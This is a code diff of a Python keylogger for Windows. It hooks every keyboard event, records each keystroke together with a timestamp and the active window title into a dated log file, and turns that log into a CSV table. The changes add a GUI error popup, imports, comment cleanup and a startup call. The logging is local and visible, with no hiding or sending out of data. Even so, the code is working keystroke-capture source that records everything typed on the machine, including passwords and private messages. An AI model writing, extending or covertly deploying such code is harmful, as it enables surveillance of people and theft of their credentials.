@@ -8,11 +8,12 @@ import pythoncom
 from datetime import datetime
 import  pandas as pd
 import win32gui
+import pdfkit
+import PySimpleGUI as sg
 
 
-
+# converts the text file to a table with headers.
 def ConvertToTable():
-  # print("The convert to table function is running.")
   datelogname = datetime.today().strftime('%m-%d-%Y')  # to be used for naming the log with the date in it.
   try:
     f=open(datelogname + '-logfile.txt','r')
@@ -22,48 +23,47 @@ def ConvertToTable():
 
 
   df = pd.read_csv(f, sep='|',encoding= "ISO-8859-1", names=["TimeStamp", "Current Window", "KeyStrokes"] )
-  df.to_csv(datelogname +'-LogFileTable.csv', index=None,)
-  # print("The function has converted the text file to a table")
+  try:
+    df.to_csv(datelogname +'-LogFileTable.csv', index=None,)
+  except PermissionError:
+    print("User has opened the table file, they still have it opened. Which means we cannot open it.  ")
+    print("They need to close the file or we cannot access it. ")
+    sg.PopupError('Hey! Close out the Table file! I cant write to the table as long as you have it open')
 
 
 
-def GiveNewLine():  # this will open the file and make the first line start with the timestamp next to it.  Ensures it starts with a datetimestamp on the first line at start.
+
+ # this will open the file and make the first line start with the timestamp next to it.  Ensures it starts with a datetimestamp on the first line at start.
+def GiveNewLine():
   datelogname = datetime.today().strftime('%m-%d-%Y')
 
   datetimestamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')
   w = win32gui
   currentwindow = w.GetWindowText (w.GetForegroundWindow())
 
-  #print(w.GetWindowText (w.GetForegroundWindow()))
   logfile = open(datelogname + "-logfile.txt", 'a+')
 
 
-  #print(windowname)
   logfile.write("\n" + datetimestamp + "|" + currentwindow + "|" + " ")  # Adds a new line. Enters the current date, time, and current window
   logfile.close()
 
 
 
-# Define a new function for the keylogger
-
-# sg.Popup('Hello from pysimple!', ' This is the shortest GUI program ever!')
-
-# def somefunction(event):
- # currentwindow = windowname
-  # return True
 
 
 
 
+
+
+# The main function of the program. It runs whenever a key is pressed.
 def OnKeyboardEvent(event):
     global windowname
 
-    # print("The most important function called onkeyboard event has started running")
     w = win32gui
     currentwindow = w.GetWindowText(w.GetForegroundWindow())
 
     datelogname = datetime.today().strftime('%m-%d-%Y')  # to be used for naming the log with the date in it.
-    datetimestamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')  # to be used for timestamping the date and time the keys were pressed
+    datetimestamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')  # to be used for timestamping the date and the  time the keys were pressed
     logfile = open( datelogname + '-logfile.txt', 'a+')   # open the file  in append mode. If the file does not exist, then create the file and open it in append mode.
     buffers = logfile.read()
 
@@ -74,17 +74,13 @@ def OnKeyboardEvent(event):
 
     logfile = open(datelogname + "-logfile.txt", 'a+')
 
-    apples = 2
     windowname = event.WindowName
     keylogs = chr(event.Ascii)
 
-    windownameholder = windowname
 
-    #print('Time:', event.Time)
 
-    #print("window name is " + windowname)
-    #print("windowname holder is " +  windownameholder)
 
+    # This code will start a new line if the Current window that the user is using changes to a different window.
     def NewLineIfWindowChanges():
       w = win32gui
       currentwindow = w.GetWindowText(w.GetForegroundWindow())
@@ -96,7 +92,8 @@ def OnKeyboardEvent(event):
         data = fh.readlines()
 
         try:
-          lastline = data[-5]
+          lastline = data[-1]
+          print(lastline)
         except IndexError:
           print('The last line has not been written yet, exit function and keep going')
           return
@@ -104,12 +101,7 @@ def OnKeyboardEvent(event):
 
 
 
-      # print('test')
-      # print(str(windowname) in str(lastline))
-      # print("The window has changed")
-      # logfile2 = open(datelogname + "-logfile.txt", 'a+')
-      # logfile2.write("\n" + datetimestamp + "|" + currentwindow + "|" + " ")
-      # logfile2.close()
+
       if str(lastline).find(str(windowname)) != -1:
         'print("The window name  has not changed")'
 
@@ -140,10 +132,7 @@ def OnKeyboardEvent(event):
     logfile.write(buffers)  # writes the key pressed  to the file
 
     logfile.close()   # closes the file
-    #print("Onkeyboard function has come to the end of its function")
     ConvertToTable()
-
-
     return True
 
 
@@ -153,7 +142,6 @@ def OnKeyboardEvent(event):
 
 
 
-  # watch for all keyboard events
 
 
 
@@ -175,6 +163,7 @@ def main():
 
 
 if __name__== "__main__":
+  GiveNewLine()
   print("The program has started, Start typing!")
   main()
 
